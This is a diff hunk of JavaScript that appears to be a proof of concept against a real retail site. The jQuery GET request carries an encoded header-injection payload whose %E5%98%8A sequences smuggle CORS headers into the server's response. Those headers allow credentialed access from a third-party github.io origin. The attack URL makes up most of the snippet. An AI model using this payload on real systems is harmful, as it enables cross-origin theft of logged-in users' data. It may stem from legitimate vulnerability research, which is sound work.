@@ -24,8 +24,6 @@ http.send();
 $.ajax({
     type: "GET",
     url: "https://www.dreamland.be/e/ClickInfo?URL=https://www.dreamland.be/x%E5%98%8AX-Frame-Options:%20ALLOW%E5%98%8AAccess-Control-Allow-Credentials:%20true%E5%98%8AAccess-Control-Allow-Origin:%20https://hacky4594.github.io%E5%98%8A"
-    data: reqBody,
-    dataType: "json",
     success: function(data, textStatus) {
         if (data.redirect) {
             // data.redirect contains the string URL to redirect to
